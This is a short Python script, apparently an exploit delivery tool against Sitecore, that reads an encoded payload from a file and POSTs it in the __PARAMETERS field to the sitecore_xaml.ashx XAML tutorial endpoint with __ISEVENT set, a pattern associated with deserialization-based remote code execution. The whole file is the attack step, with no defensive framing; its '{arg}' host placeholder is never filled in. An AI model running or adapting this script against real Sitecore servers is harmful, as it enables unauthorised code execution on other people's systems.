import requests
import sys

# Read the value from output.txt
with open('encodeout.txt', 'r') as file:
    parameter_value = file.read().strip()  # .strip() to remove any leading/trailing whitespace

# URL and headers remain the same
Baggy_url = "https://{arg}/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index"
Baggy_headers = {"Content-Type": "application/x-www-form-urlencoded"}

# Update the data dictionary to use the value read from the file
Baggy_data = {"\r\n__ISEVENT": "1", "__SOURCE": '', "__PARAMETERS": parameter_value}

# Make the POST request
response = requests.post(Baggy_url, headers=Baggy_headers, data=Baggy_data)

# Optionally, you can print the response or handle it as needed
print(response.status_code)